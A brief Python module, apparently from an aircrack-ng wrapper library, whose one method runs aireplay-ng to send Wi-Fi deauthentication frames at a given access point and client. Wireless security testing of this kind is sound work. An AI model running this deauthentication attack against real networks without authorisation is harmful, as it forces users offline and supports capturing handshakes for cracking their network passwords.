import shlex
import subprocess

from aircrack.models import WifiAdapter, Station


class Aireplay:
    def __init__(self):
        pass

    @classmethod
    def send_deauth(cls, wifi_card: WifiAdapter, station: Station, count: int = 10):
        subprocess.call(shlex.split(
            f'aireplay-ng {wifi_card.interface} --deauth {count} -a {station.bssid} -c {station.station_mac}'
        ))
